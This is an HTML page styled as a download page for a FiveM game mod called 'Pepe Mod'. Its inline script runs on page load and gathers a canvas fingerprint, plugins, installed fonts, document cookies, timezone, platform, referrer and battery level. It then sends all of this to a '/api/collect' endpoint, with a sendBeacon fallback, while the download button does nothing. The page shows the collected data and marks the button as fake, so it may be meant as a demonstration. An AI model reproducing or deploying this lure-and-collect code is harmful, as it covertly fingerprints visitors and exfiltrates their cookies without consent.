<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FiveM Pepe Mod</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0b0b0b;
            font-family: 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #eee;
            padding: 20px;
        }
        .card {
            max-width: 800px;
            width: 100%;
            background: #1a1a1a;
            border-radius: 30px;
            padding: 30px;
            border: 1px solid #00ffcc44;
            box-shadow: 0 0 40px rgba(0,255,200,0.1);
        }
        h1 {
            font-size: 3rem;
            background: linear-gradient(135deg, #00ffcc, #00b8ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-align: center;
            margin-bottom: 10px;
        }
        .sub {
            text-align: center;
            color: #aaa;
            margin-bottom: 20px;
        }
        .preview {
            background: #111;
            border-radius: 15px;
            padding: 15px;
            margin: 15px 0;
            text-align: center;
        }
        .preview img { max-width: 100%; border-radius: 10px; }
        .btn {
            display: block;
            background: #00ffcc;
            color: #0b0b0b;
            padding: 14px;
            border-radius: 50px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            width: 100%;
            font-size: 1.1rem;
            margin: 10px 0;
        }
        .btn:hover { background: #00ddaa; }
        .data-box {
            background: #0f0f0f;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            border: 1px solid #333;
            font-family: 'Consolas', monospace;
            font-size: 0.85rem;
            color: #00ffcc;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .status {
            text-align: center;
            margin: 10px 0;
            font-size: 0.9rem;
        }
        .footer {
            text-align: center;
            color: #555;
            font-size: 0.8rem;
            border-top: 1px solid #222;
            padding-top: 15px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="card">
        <h1>🐸 Pepe Mod</h1>
        <p class="sub">🔥 FiveM mod preview – loading data...</p>
        <div class="preview">
            <img src="https://via.placeholder.com/600x200/00ffcc/0b0b0b?text=Pepe+Mod+Preview" alt="Preview">
        </div>
        <button class="btn" id="downloadBtn">⬇ Download Now (fake)</button>
        <div id="status" class="status">⏳ Collecting data...</div>
        <div id="dataDisplay" class="data-box">Waiting...</div>
        <div class="footer">© 2025 Pepe Team</div>
    </div>

    <script>
        (function() {
            // ---- Helper functions ----
            function getFingerprint() {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Pepe', 2, 15);
                ctx.fillStyle = 'rgba(102,204,0,0.7)';
                ctx.fillText('Mod', 4, 17);
                return canvas.toDataURL();
            }

            function getPlugins() {
                return Array.from(navigator.plugins).map(p => p.name).join(', ');
            }

            function getFonts() {
                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact'];
                const available = [];
                const dummy = document.createElement('div');
                dummy.style.fontFamily = 'monospace';
                dummy.innerText = 'abcdefghijklmnopqrstuvwxyz';
                document.body.appendChild(dummy);
                const defaultWidth = dummy.offsetWidth;
                for (const font of testFonts) {
                    dummy.style.fontFamily = font + ', monospace';
                    if (dummy.offsetWidth !== defaultWidth) {
                        available.push(font);
                    }
                }
                document.body.removeChild(dummy);
                return available.join(', ');
            }

            // ---- Collect data ----
            const data = {
                screen: window.screen.width + 'x' + window.screen.height,
                colorDepth: window.screen.colorDepth,
                fingerprint: getFingerprint().substring(0, 80) + '...',
                plugins: getPlugins(),
                fonts: getFonts(),
                cookies: document.cookie || 'none',
                language: navigator.language,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                memory: navigator.deviceMemory || 'Unknown',
                referrer: document.referrer || 'Direct',
                url: window.location.href,
                battery: 'Waiting...',
            };

            const statusEl = document.getElementById('status');
            const displayEl = document.getElementById('dataDisplay');

            function updateDisplay() {
                let text = '=== COLLECTED DATA ===\n';
                for (const [key, value] of Object.entries(data)) {
                    text += `${key}: ${value}\n`;
                }
                text += '\n--- This data was sent to the server ---';
                displayEl.innerText = text;
            }

            function sendAndShow(finalData) {
                // Show data on page immediately
                updateDisplay();

                // Send to backend
                fetch('/api/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(finalData)
                })
                .then(res => res.json())
                .then(() => {
                    statusEl.innerText = '✅ Data sent successfully!';
                    statusEl.style.color = '#00ff88';
                })
                .catch(err => {
                    statusEl.innerText = '⚠️ Send failed, but data shown above.';
                    statusEl.style.color = '#ffaa00';
                    console.error('Fetch error:', err);
                    // fallback
                    try { navigator.sendBeacon('/api/collect', JSON.stringify(finalData)); } catch(e) {}
                });
            }

            // ---- Battery ----
            if (navigator.getBattery) {
                navigator.getBattery()
                    .then(battery => {
                        data.battery = (battery.level * 100).toFixed(0) + '%';
                        sendAndShow(data);
                    })
                    .catch(() => {
                        data.battery = 'Error';
                        sendAndShow(data);
                    });
            } else {
                data.battery = 'Not supported';
                sendAndShow(data);
            }

            // ---- Fake download ----
            document.getElementById('downloadBtn').addEventListener('click', function(e) {
                e.preventDefault();
                alert('Mod is in preview. No download available.');
            });

        })();
    </script>
</body>
</html>
